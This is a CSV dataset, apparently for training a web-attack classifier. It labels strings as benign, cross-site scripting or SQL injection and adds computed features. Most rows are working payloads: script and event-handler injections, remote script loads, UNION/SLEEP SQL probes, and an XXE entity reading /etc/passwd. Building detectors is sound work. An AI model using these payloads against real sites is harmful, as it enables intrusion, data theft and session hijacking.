input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",1,114,4.403803196888058,2,0,0,0.10526315697137582
<body/onload=&lt;!--&gt;&#10alert(1)>,1,37,4.4251412032329,0,0,0,0.4054053944485029
"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",1,88,5.074789897819521,6,0,0,0.35227272326962816
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",2,94,4.07780555284375,6,0,1,0.34042552829334544
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
"<? foo=""><script>javascript:alert(1)</script>"">",1,47,4.351837255656769,2,1,0,0.31914892937981004
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",2,104,4.161852185552907,2,0,0,0.30769230473372783
"`""><\x00script>javascript:alert(1)</script>",1,43,4.297675800911846,1,0,0,0.27906976095186603
"<img src=x onerror=\x32""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
"`>ABC<div style=font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF",1,79,5.132523469531776,4,0,0,0.26582278144528126
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--",2,54,4.286661344475611,6,0,1,0.37037036351166
<script ^__^>alert(String.fromCharCode(49))</script ^__^,1,56,4.624057377298847,0,0,0,0.30357142315051033
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",1,66,4.45358020330253,4,0,0,0.28787878351698815
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,54,4.579258919656727,2,0,0,0.29629629080932796
"<XML ID=I><X><C><![<IMG SRC=""javas]]<![cript:document.vulnerable=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>",1,140,5.207141340156725,2,0,0,0.31428571204081635
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",2,109,4.199114929031373,2,0,0,0.3211009144853127
<iframe/src \/\/onload = prompt(1),1,34,4.29277019393699,0,0,0,0.2647058745674743
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,2,51,4.485575831913048,0,0,1,0.09803921376393698
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",2,104,4.554571888891652,2,0,1,0.29807692021079885
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,1,59,4.235570644451101,0,0,0,0.40677965412237876
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--",2,73,4.43053366499927,2,0,0,0.31506848883467825
"<link rel=""stylesheet"" href=""javascript:document.vulnerable=true;"">",1,67,4.496944653933763,4,0,0,0.17910447493873918
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
`'><script>\xE2\x80\x88javascript:alert(1)</script>",1,103,4.553608871755526,2,1,0,0.2718446575549062
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1,54,4.76396574282408,4,0,0,0.33333332716049396
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,1,47,4.286848236242022,2,0,0,0.4255319058397467
"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
ORDER BY 14,2,11,3.095795255000934,0,0,0,0.0
&#x03C,1,6,2.584962500721156,0,0,0,0.33333327777778704
"\"";document.vulnerable=true;;//",1,31,4.0667842134731025,1,0,0,0.29032257127991706
"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.864659425750382,4,0,0,0.22784809838166964
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",1,81,4.112128126663952,2,0,0,0.14814814631915868
"<IMG SRC=x onkeyup=""alert(String.fromCharCode(88,83,83))"">",1,58,4.956866124326013,2,0,0,0.22413792717003575
"<img \x47src=x onerror=""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
"<img \x34src=x onerror=""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;,1,58,4.521329487621875,2,0,0,0.3793103382877528
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1,97,4.213703790435894,2,0,0,0.37113401679243285
&lt,1,3,1.584962500721156,0,0,0,0.33333322222225925
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,1,82,4.74239678496911,0,0,0,0.402439019482451
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",1,82,4.500006690662,2,0,0,0.18292682703747773
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",1,60,4.889898095464288,2,0,0,0.19999999666666674
<script>alert(1)</script>,1,25,3.7834651896016473,0,1,0,0.27999998880000043
"<br size=\""&{alert('XSS')}\"">",1,29,4.444187891679296,4,0,0,0.48275860404280674
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",2,121,4.454378338397637,2,0,1,0.2975206586981764
admin' #,2,8,3.0,1,0,0,0.24999996875000394
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,50,4.511272380112911,2,0,0,0.31999999360000014
"<div style=""behaviour: url([link to code]);"">",1,45,4.624751985026256,2,0,0,0.2444444390123458
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--",2,170,4.329185329540349,0,0,1,0.28823529242214535
<object onerror=javascript:javascript:alert(1)>,1,47,4.189930011519816,0,0,0,0.14893616704391135
ORDER BY 10,2,11,3.095795255000934,0,0,0,0.0
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",1,85,4.952350095761651,4,0,0,0.31764705508650526
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,1,212,3.1969163477800002,0,0,0,0.41509433766464937
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",2,55,4.39625408684495,2,0,0,0.2727272677685951
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",2,122,4.486453134578363,2,0,1,0.3032786860386993
"></iframe><script>alert(123)</script>
<body onLoad=while(true) alert('XSS');"">",1,78,4.883373418396976,3,1,0,0.28205127843524
http://www.<script>alert(1)</script .com,1,40,4.2373261452560085,0,1,0,0.2749999931250002
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1,81,5.20233191044737,6,0,0,0.2716049349184576
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",1,61,4.754530682450518,4,0,0,0.29508196237570555
thank you for your order,0,24,3.418295834054489,0,0,0,0.0
ORDER BY 17,2,11,3.095795255000934,0,0,0,0.0
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",1,62,4.629374286396268,6,0,0,0.35483870395421446
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",2,137,4.41889137023903,2,0,1,0.306569340827961
&#X000003c,1,10,2.1609640474436813,0,0,0,0.19999998000000202
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1,83,5.246741353133134,4,0,0,0.22891565989258242
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--",2,59,4.435455286899907,0,0,1,0.22033897931628849
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,1,42,4.975418017913833,0,0,0,0.3333333253968256
<svg><script>//&NewLine;confirm(1);</script </svg>,1,50,4.438562939644917,0,1,0,0.31999999360000014
<script\x0C>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,83,83))"">",1,59,4.846720753111609,2,0,0,0.22033897931628849
"`""><\x00script>javascript:alert(1)</script>",1,43,4.297675800911846,1,0,0,0.27906976095186603
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1,42,4.927798970294785,4,0,0,0.3333333253968256
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",1,62,4.350969045608525,2,0,0,0.22580644797086374
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",2,69,4.409968522342837,2,0,0,0.3043478216761185
<IMG SRC=javascript:alert('XSS')>,1,33,4.574400937409153,2,0,0,0.2424242350780535
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",2,88,4.300404948233784,2,0,0,0.3181818145661158
"<;IMG SRC="";javascript:alert(';XSS';)"";",1,39,4.538750539919588,4,0,0,0.3589743497698885
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",1,64,4.947123781480403,2,0,0,0.20312499682617194
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",2,74,4.344939806549713,2,0,0,0.29729729327976634
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",2,75,4.2569844045055865,6,0,1,0.3599999952000001
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",1,92,4.730432750505621,2,0,0,0.34782608317580344
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:document.vulnerable=true;"">",1,80,4.997976257876193,4,0,0,0.18749999765625003
<script\x0D>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
WHERE 1=1 AND 1=1#,2,18,3.2390979179887864,0,0,0,0.1666666574074079
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",1,52,4.9551534200225635,2,0,0,0.2884615329142013
"><script alert(String.fromCharCode(88,83,83))</script>
'>><marquee><h1>XSS</h1></marquee>
'>><script>alert('XSS')</script>",1,122,4.748567352690468,4,1,0,0.3032786860386993
UNION ALL SELECT 1#,2,19,3.5368867237421675,0,0,1,0.05263157617728546
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xee;</foo>",1,135,5.2635012498667075,6,0,0,0.2814814793964335
"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",1,62,4.554293285879274,5,0,0,0.32258063995837677
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"`'><script>\x3Bjavascript:alert(1)</script>
`'><script>\x0Djavascript:alert(1)</script>",1,87,4.430775104745721,2,1,0,0.2758620657946889
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",1,64,4.915873781480403,2,0,0,0.20312499682617194
"&lt;EMBED SRC=\""data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\"" type=\""image/svg+xml\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",1,447,5.799016071465026,6,0,0,0.08053691257150579
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",1,72,4.394736980218353,2,0,0,0.1666666643518519
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1,65,4.598593390813312,0,0,0,0.261538457514793
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",1,64,4.947123781480403,2,0,0,0.20312499682617194
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"ORDER BY 1,SLEEP(5),3,4#",2,24,4.0220552088742005,0,0,0,0.24999998958333375
"<meta HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.vulnerable=true</SCRIPT>"">",1,89,4.8657984588861245,4,1,0,0.20224718873879563
"<div/onmouseover='alert(1)'> style=""x:"">",1,40,4.553055907333276,4,0,0,0.3249999918750002
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1,54,4.76396574282408,4,0,0,0.33333332716049396
&#x000003c;,1,11,2.40400975732486,0,0,0,0.2727272479338866
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.889975881446585,4,0,0,0.22784809838166964
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1,94,4.631970267514144,2,0,0,0.24468084846084204
"<;IMG LOWSRC="";javascript:alert(';XSS';);"";>;",1,45,4.666047330580116,4,0,0,0.37777776938271623
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",1,61,4.949191387055882,2,0,0,0.1803278658962645
<svg><script>//&NewLine;confirm(1);</script </svg>,1,50,4.438562939644917,0,1,0,0.31999999360000014
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,1,59,4.375967574962162,0,1,0,0.38983050186727963
"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",1,78,4.562073495465946,3,0,0,0.28205127843524
"<img\x13src=x onerror=""javascript:alert(1)"">",1,44,4.544325652580697,2,0,0,0.22727272210743815
<img src ?itworksonchrome?\/onerror = alert(1),1,46,4.262344294513459,0,0,0,0.17391303969754263
add to cart,0,11,2.7321588913645702,0,0,0,0.0
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1,60,5.067481795998514,4,0,0,0.23333332944444451
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",2,45,4.129981707104247,6,0,1,0.3333333259259261
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",1,64,4.726813383509937,4,0,0,0.2812499956054688
<sVg><scRipt >alert&lpar;1&rpar; {Opera},1,40,4.181687083026443,0,0,0,0.24999999375000018
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",1,72,4.532238848689048,2,0,0,0.1666666643518519
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",1,114,4.415911109095149,2,0,0,0.31578947091412746
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",1,78,4.449347561156072,2,0,0,0.1538461518737673
"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",1,60,4.81715596252095,4,0,0,0.2666666622222223
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"<img \x34src=x onerror=""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",1,170,4.667860706847773,8,0,0,0.2470588220761246
<script ^__^>alert(String.fromCharCode(49))</script ^__^,1,56,4.624057377298847,0,0,0,0.30357142315051033
"perl -e ';print "";&;<;SCR\0IPT>;alert("";XSS"";)<;/SCR\0IPT>;"";;'; >; out",1,71,4.505593502336726,6,0,0,0.4366197121602858
"AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",2,170,4.938983754759625,0,0,1,0.17058823429065745
<style><!--</style><script>document.vulnerable=true;//--></script>,1,66,4.35123342296672,0,1,0,0.33333332828282836
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",1,55,4.37437647742913,2,1,0,0.3090909034710745
update account settings,0,23,3.5670402169265785,0,0,1,0.0
ORDER BY 29--,2,13,3.238901256602631,0,0,0,0.15384614201183525
"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",1,79,5.213414096437639,2,0,0,0.20253164300592857
</title><SCRIPT>document.vulnerable=true;</script>,1,50,4.543981820580905,0,1,0,0.2199999956000001
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1,125,3.6133144608635055,0,0,0,0.39199999686400006
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.626073746724625,4,0,0,0.22535210950208298
<script>%(payload)s</script>,1,28,3.9677201004744993,0,1,0,0.28571427551020445
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;",1,63,4.983165788847683,4,0,0,0.30158729680020163
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#",2,132,4.405877590605512,0,0,1,0.27272727066115704
"<form><isindex formaction=""javascript&colon;confirm(1)""",1,55,4.447103750156402,2,0,0,0.18181817851239676
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1,42,4.478876280478754,4,0,0,0.2857142789115648
ORDER BY 8--,2,12,3.084962500721156,0,0,0,0.16666665277777895
"<xml src=""javascript:document.vulnerable=true;"">",1,48,4.506328385912461,2,0,0,0.1874999960937501
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",2,73,3.6505926106219073,0,0,1,0.28767122893601055
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",2,71,4.259061684598288,6,0,1,0.35211267109700467
"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",1,51,4.61606645999253,2,0,0,0.2549019557862362
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",1,84,4.567347411070556,2,0,0,0.1428571411564626
or SLEEP(5),2,11,3.2776134368191157,0,0,0,0.1818181652892577
<h1><font color=blue>hellox worldss</h1>,1,40,4.134829508503262,0,0,0,0.19999999500000012
<script\x09>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
"`'><script>\x0Ajavascript:alert(1)</script>
`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",1,95,4.558711923847142,2,1,0,0.2736842076454294
&#x00003C,1,9,2.2810361125534233,0,0,0,0.22222219753086697
AND 1083=1083 AND (1427=1427,2,28,3.6375375112660517,0,0,0,0.10714285331632667
or SLEEP(5)=',2,13,3.546593564294939,1,0,0,0.3076922840236705
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",1,71,4.92039201365758,2,0,0,0.1971830958143226
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",1,302,3.7641566648927807,2,0,0,0.4039735085961142
</scrip</script>t><img src =q onerror=prompt(8)>,1,48,4.09140865756051,0,0,0,0.2499999947916668
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\""&gt;",1,120,5.547451562715947,4,0,0,0.19166666506944446
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",2,78,4.236510712091414,6,0,1,0.35897435437212366
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,1,53,4.777646341797157,2,0,0,0.3018867867568531
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9",2,34,3.984234164652488,0,0,1,0.23529411072664383
"<iframe src=""javascript:alert('XSS by \nxss');""></iframe><marquee><h1>XSS by xss</h1></marquee>",1,95,4.795085146699851,4,0,0,0.26315789196675904
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,56,4.597097109364437,4,0,0,0.33928570822704096
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--",2,53,4.404543747253433,2,0,0,0.2830188625845498
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",1,62,4.478390570284173,2,0,0,0.2419354799687826
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",1,55,4.410740113792766,2,1,0,0.32727272132231416
<SCRIPT SRC=%(jscript)s?<B>,1,27,4.384517131793098,0,0,0,0.2962962853223598
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",1,75,4.44197511091795,2,0,0,0.1599999978666667
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1,48,4.829448698502606,4,0,0,0.2916666605902779
AS INJECTX WHERE 1=1 AND 1=1#,2,29,3.8109283062792865,0,0,0,0.10344827229488716
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--",2,61,4.503546353530728,2,0,0,0.3114754047299114
"<img\x32src=x onerror=""javascript:alert(1)"">",1,44,4.589780198035243,2,0,0,0.22727272210743815
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1,88,4.972295011357545,4,0,0,0.21590908845557855
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1,88,4.972295011357545,4,0,0,0.21590908845557855
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;,1,49,4.474417946545265,0,0,0,0.24489795418575605
"<BGSOUND SRC=""javascript:javascript:alert(1);"">",1,47,4.7222608627677705,2,0,0,0.21276595291987335
leave a comment,0,15,3.1898980954642875,0,0,0,0.0
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",1,70,4.532874360347046,6,0,0,0.29999999571428576
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://www.securitycompass.com/xss.htc""><xss:xss>XSS</xss:xss></html>",1,126,4.59519339085812,4,0,0,0.2301587283320736
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",1,63,4.617776106170638,4,0,0,0.2857142811791384
file uploaded successfully,0,26,3.5364142371222305,0,0,0,0.0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--",2,55,4.435194258664519,2,0,0,0.2909090856198348
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",2,95,4.605000709961498,2,0,1,0.29473683900277015
"<base HREF=""javascript:document.vulnerable=true;//"">",1,52,4.702856968507876,2,0,0,0.21153845747041428
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",2,84,4.303546433884002,2,0,0,0.3095238058390023
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;",1,74,4.596155014476867,2,0,0,0.3783783732651571
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",2,83,4.6055636275138685,2,0,1,0.28915662302220935
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,1,241,2.859285438152286,0,0,0,0.30705394063463093
OR 3409=3409 AND ('pytW' LIKE 'pytY,2,35,4.261725074756386,3,0,0,0.14285713877551032
<body/onload=&lt;!--&gt;&#10alert(1)>,1,37,4.4251412032329,0,0,0,0.4054053944485029
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",2,75,3.7306329275246535,0,0,1,0.30666666257777786
<script>alert('XSS')</script>,1,29,3.9783335811852636,2,1,0,0.3103448168846615
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",1,425,5.762252241840229,6,0,0,0.05647058810242215
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",1,109,4.630031572245168,0,0,0,0.2568807315882502
<;SCRIPT>;a=/XSS/,1,17,3.572469458770135,0,0,0,0.4117646816609011
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",1,55,4.353553804197736,4,0,0,0.19999999636363644
"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
